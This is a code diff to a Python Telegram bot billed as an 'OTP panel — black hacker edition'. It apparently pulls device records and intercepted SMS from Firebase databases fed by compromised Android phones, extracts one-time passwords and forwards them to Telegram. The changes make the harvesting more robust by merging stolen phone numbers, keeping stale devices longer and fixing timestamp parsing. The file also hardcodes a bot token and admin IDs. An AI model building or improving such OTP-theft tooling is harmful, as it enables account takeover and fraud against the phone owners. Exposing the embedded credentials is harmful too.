@@ -3,7 +3,7 @@
 ══════════════════════════════════════════════════════
   ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
   Zero-Lag UI (O(1) Fetch) | Telegram FloodWait Bypass
-  Titan RAM Cleaner | 1000+ Users Traffic Optimized
+  Smart Data Merge | 1000+ Users Traffic Optimized
 ══════════════════════════════════════════════════════
 """
 
@@ -48,9 +48,8 @@ PAGE_SIZE       = 20
 TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89ImsXh6mct8")
 BOT_USERNAME    = "fjjhfbot"
 
-# 🔥 OPTIMIZED FOR RAILWAY 500MB LIMIT
 CHUNK_SIZE      = 50    
-HTTP_CONCURRENCY= 100 # Reduced slightly to save RAM    
+HTTP_CONCURRENCY= 100    
 
 ADMIN_IDS: set[int] = {
     6860106371,   
@@ -68,7 +67,6 @@ CLONES_DIR = os.path.join(DB_DIR, "Clones")
 SYS_DIR = os.path.join(DB_DIR, "System")
 SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 
-# 🔥 MISSING VARIABLES ADDED HERE
 PREFETCH_POOL: dict[str, list] = {}
 user_seen_unreg: dict[int, set] = {}
 chats_registry: dict[str, set] = {}
@@ -96,9 +94,7 @@ API_LOCK = asyncio.Lock()
 CACHE_LOCK = asyncio.Lock()  
 POLL_LOCK = asyncio.Lock()   
 WORKER_SEMAPHORE = asyncio.Semaphore(HTTP_CONCURRENCY) 
-
-# Prevents Heavy Scans from freezing the bot UI for other users!
-HEAVY_TASK_LIMITER = asyncio.Semaphore(5) # Lowered for Railway OOM prevention
+HEAVY_TASK_LIMITER = asyncio.Semaphore(5) 
 
 scan_progress = {
     "scanned": 0,
@@ -228,14 +224,15 @@ async def auto_save_loop():
                 await asyncio.to_thread(save_user, uid)
                 await asyncio.sleep(0)
             
-            if len(seen_ids) > 5000: # Lowered for Railway RAM limit
+            if len(seen_ids) > 5000:
                 seen_ids.clear()
             
             now_ts = time.time()
             expired_users = [k for k, v in JOIN_VERIFIED_CACHE.items() if now_ts - v > 3600]
             for u in expired_users: JOIN_VERIFIED_CACHE.pop(u, None)
             
-            dead_devs = [k for k, v in MASTER_DEVICE_DICT.items() if (now_ts - v.timestamp) > 86400]
+            # 🔥 Fix: Only deletes genuine dead devices now (Older than 48 hours)
+            dead_devs = [k for k, v in MASTER_DEVICE_DICT.items() if (now_ts - v.timestamp) > 172800]
             for d in dead_devs: MASTER_DEVICE_DICT.pop(d, None)
             
             gc.collect() 
@@ -327,7 +324,6 @@ async def get_http_session() -> aiohttp.ClientSession:
 async def fb_get(path: str, base: str, timeout: int = 6, params: str = "") -> Optional[dict]:
     try:
         session = await get_http_session()
-        # 🔥 Fixed Memory Leak: Added Params to limit data size
         url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
         if params: url += f"?{params}"
         elif not path: url = url.replace("?shallow=true", ".json")
@@ -557,6 +553,15 @@ def parse_status_str(val) -> str:
 def parse_status_bool(val) -> str:
     return "online" if val is True else "offline"
 
+# 🔥 FIX 1: Smart Timestamp Parser (Prevents devices from getting instantly wiped)
+def get_valid_ts(val) -> int:
+    try:
+        t = float(val)
+        if t > 1e11: t /= 1000
+        if t > 1e9: return int(t) 
+    except: pass
+    return int(time.time())
+
 def sms_date(sms: dict) -> str:
     date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
     if date_str: return date_str
@@ -631,10 +636,20 @@ def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_e
     if is_error: return f"⚠️ <b>ERROR DETECTED</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
     return f"<b>{'☠️ TARGET VULNERABLE (UNREGISTERED)' if not is_reg else '✅ TARGET SECURE (REGISTERED)'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ Ping: {ms} ms"
 
+# 🔥 FIX 2: Smart Data Merge (Prevents Numbers from Disappearing)
 def push_to_master_vault(temp_devices):
     for d in temp_devices:
-        if d.numbers:  
-            MASTER_DEVICE_DICT[d.id] = d
+        if not d.numbers:  
+            continue
+        if d.id in MASTER_DEVICE_DICT:
+            existing = MASTER_DEVICE_DICT[d.id]
+            # Safely merge data so incomplete API fetches don't wipe out existing numbers
+            d.numbers = list(set(existing.numbers + d.numbers))
+            if existing.status == "online": d.status = "online" # Favor online state
+            if existing.battery > d.battery: d.battery = existing.battery
+            if d.name.startswith("Device-") and not existing.name.startswith("Device-"): 
+                d.name = existing.name
+        MASTER_DEVICE_DICT[d.id] = d
     
     dev_list = list(MASTER_DEVICE_DICT.values())
     dev_list.sort(key=lambda x: (0 if x.status == "online" else 1, -x.timestamp))
@@ -657,7 +672,8 @@ async def fetch_device_data_task(tag: str, url: str, temp_list: list):
                 if not nums: continue 
                 added_set.add(dev_id)
                 model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                temp_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0), numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                ts = get_valid_ts(info.get("currentTimeMillis") or sim.get("timestamp"))
+                temp_list.append(Device(id=dev_id, name=model, status=parse_status_str(info.get("Status")), battery=parse_battery(info.get("Battery")), timestamp=ts, numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if user_data_all and isinstance(user_data_all, dict):
             for dev_id, data in user_data_all.items():
@@ -666,7 +682,8 @@ async def fetch_device_data_task(tag: str, url: str, temp_list: list):
                 nums = extract_all_nums(data)
                 if not nums: continue 
                 added_set.add(dev_id)
-                temp_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=int(data.get("timestamp") or 0), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                ts = get_valid_ts(data.get("timestamp"))
+                temp_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")), timestamp=ts, numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
         
         if clients_all and isinstance(clients_all, dict):
             for dev_id, client in clients_all.items():
@@ -679,7 +696,8 @@ async def fetch_device_data_task(tag: str, url: str, temp_list: list):
                 if not nums and not client.get("modelName"): continue
                 added_set.add(dev_id)
                 model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                temp_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
+                ts = get_valid_ts(client.get("timestamp"))
+                temp_list.append(Device(id=dev_id, name=model, status=parse_status_bool(client.get("status")), battery=parse_battery(client.get("battery")), timestamp=ts, numbers=nums, device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0))
     except: pass
 
 async def _update_global_cache():
@@ -1488,11 +1506,10 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             return
     except: pass
 
-# 🔥 MISSING SMS FORWARDER ADDED
 async def _forward_sms(device: Device, sms: dict):
     if not _main_app: return
     otp = extract_otp(sms.get("body", "") or sms.get("message", "") or sms.get("text", ""))
-    if not otp: return # Only notify for OTPs to prevent spam
+    if not otp: return 
     
     num_label = device.numbers[0] if device.numbers else device.name
     msg = auto_forward_msg(sms, num_label)
